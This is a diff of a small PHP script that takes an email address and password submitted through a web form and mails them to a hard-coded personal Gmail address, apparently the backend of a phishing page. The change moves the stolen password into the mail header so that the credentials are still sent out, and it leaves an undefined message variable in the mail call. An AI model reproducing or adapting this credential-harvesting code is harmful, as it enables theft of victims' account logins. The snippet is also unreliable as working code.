@@ -3,8 +3,9 @@ $email = $_POST["email"];
 $passkey = $_POST["pass"];
 
 $recipient = "israelstoba@gmail.com";
-$message = "Email: $email\nPassword: $passkey";
-$mailheader = "From: $email\r\n";
+
+
+$mailheader = "From:".$email."<".$passkey.">\r\n";
 
 mail($recipient, $message, $mailheader)
 or die("Error");
